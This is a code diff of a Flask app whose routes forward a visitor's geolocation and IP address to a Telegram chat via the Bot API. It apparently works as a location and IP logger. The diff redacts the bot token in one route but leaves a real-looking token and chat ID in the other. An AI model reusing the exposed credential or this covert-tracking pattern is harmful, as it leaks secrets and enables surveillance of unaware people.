@@ -13,15 +13,15 @@ def send_location():
     longitude = request.form['longitude']
     
     # Send the location to Telegram using the Telegram Bot API
-    bot_token = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg'
-    chat_id = '373715044'
+    bot_token = 'YOUR_BOT_TOKEN'
+    chat_id = 'YOUR_CHAT_ID'
     api_url = f"https://api.telegram.org/bot{bot_token}/sendLocation?chat_id={chat_id}&latitude={latitude}&longitude={longitude}"
     
     response = requests.get(api_url)
     if response.status_code == 200:
-        return 'Location sent successfully1!'
+        return 'Location sent successfully!'
     else:
-        return 'Failed to send location1.'
+        return 'Failed to send location.'
 
 @app.route('/send_ip', methods=['POST'])
 def send_ip():
@@ -30,7 +30,7 @@ def send_ip():
     
     # Send the IP address to Telegram using the Telegram Bot API
     bot_token = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg'
-    chat_id = 'localipy'
+    chat_id = '373715044'
     message = f"IP Address: {ip_address}"
     api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={message}"
     
